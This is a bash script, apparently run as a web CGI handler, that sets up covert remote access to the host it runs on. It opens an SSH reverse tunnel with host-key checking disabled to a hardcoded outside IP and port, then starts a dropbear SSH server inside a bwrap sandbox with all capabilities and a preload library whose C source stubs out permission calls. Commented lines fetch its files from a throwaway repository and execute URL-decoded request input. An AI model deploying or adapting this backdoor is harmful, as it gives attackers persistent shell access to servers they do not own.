#!/usr/bin/env bash
## vars
EP=88.198.69.215
EP_PORT=19821
## avoid 500
echo -e 'Content-Type: text/plain\n'

## get fs
# cd /dev/shm
# wget https://github.com/untoreh/throwaway/archive/master.zip
# unzip master.zip
# rm master.zip
# mv throwaway-master /dev/shm/srv
cd /dev/shm/srv
. ./utils/load.env

# export PATH=".:$PATH"
# . /dev/shm/srv/utils/load.env &>/dev/null
# if declare -nf "${url_encoded/\%20*}"; then
#     printf '%b' "${url_encoded//%/\\x}" > /tmp/${SERVER_NAME}.src
# else
#     if builtin "${url_encoded/\%20*}"; then
#         printf '%b' "${url_encoded//%/\\x}" > /tmp/${SERVER_NAME}.src
#     else
#         printf 'exec %b' "${url_encoded//%/\\x}" > /tmp/${SERVER_NAME}.src
#     fi
# fi
# . /tmp/${SERVER_NAME}.src

## copy hostkeys (settler.pub,settler.ppk,settler.host)
# mkdir ~/.ssh
# cp -a $SOURCE/.ssh/ext/settler* ~/.ssh
# chmod 700 ~/.ssh/*
# mv ~/.ssh/settler.pub ~/.ssh/authorized_keys
# ln -s ~/.ssh/settler.pub ~/.ssh/authorized_keys

## reverse connection, use a common port for EP_PORT like 80/443/465...
ssh -o "StrictHostKeyChecking no" \
    -TNfy -R 9999:127.0.0.1:12322 root@$EP  -p $EP_PORT -i ~/.ssh/settler_openssh

## correct uid and gid in rootfs, username: settler, id: 1000
uname=$(id -un)
uid=$(id -u)
sed 's/1000/'$uid'/g' -i $ALP/etc/passwd
grep -q "$uname" $ALP/etc/passwd
gid=$(id -g)
sed 's/1000/'$gid'/g' -i $ALP/etc/group
mkdir -p /dev/shm/run /dev/shm/tmp $ALP/tmp $ALP/run $ALP/etc/dropbear $ALP/home/$uname $ALP/home/user
ln -s $ALP/home/user $ALP/home/$uname
chmod 700 /home/$uname/.ssh
chmod 644 /home/$uname/.ssh/authorized_keys

## bwrap dropbear
msl $ALP/usr/bin/bwrap --setenv LD_PRELOAD /lib/dumbperms.so \
               --setenv PATH /usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin \
               --setenv SHELL /bin/ash \
               --bind / /sysroot \
               --bind $ALP / \
               --dir /home/user \
               --dir /home/$uname \
               --bind /home/$uname /home/user \
               --bind /home/$uname /home/$uname \
               --proc /proc \
               --dev-bind /dev /dev \
               --new-session \
               --cap-add ALL \
               --tmpfs /tmp \
               --tmpfs /run \
               --uid $uid \
               --gid $gid \
               /usr/sbin/dropbear -BERF -p 12322 -r /home/user/.ssh/settler.host.db

exit 

## proot equivalent
# PROOT_NO_SECCOMP=1 \
ln -s ~/.ssh $ALP/.ssh ## tilde is root in proot
PROOT_TMP_DIR=/dev/shm \
             $TRO/utils/proot \
             -0 \
             --cwd=/home/user \
             -r $ALP \
             -b $TRO:/opt \
             -b /dev:/dev \
             -b /proc:/proc \
             -b /dev/shm/tmp:/tmp \
             -b /dev/shm/run:/run \
             -b /home/$uname:/root \
             /opt/usr/bin/dropbearmulti dropbear \
             -BERF -p 12322 # -r /home/user/.ssh/settler.host.db

# /bin/ash -c "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin \
             # exec /opt/usr/bin/dropbearmulti dropbear \
             # -BERF -p 12322 -r /home/user/.ssh/settler.host.db"




## dumbperms.so
# #include <unistd.h>
# #include <sys/stat.h>
# #include "syscall.h"
# #include "libc.h"
# #define _GNU_SOURCE
# #include <grp.h>
# #include <limits.h>

# int setegid(gid_t egid)
# {
#     return 0;
# }

# int seteuid(uid_t euid)
# {
#     return 0;
# }

# int setgid(gid_t gid)
# {
#     return 0;
# }

# int setuid(uid_t uid)
# {
#     return 0;
# }

# int chown(const char *path, uid_t uid, gid_t gid)
# {
#     return 0;
# }

# int chmod(const char *path, mode_t mode)
# {
#     return 0;
# }

# int initgroups(const char *user, gid_t gid)
# {
#     return 0;
# }
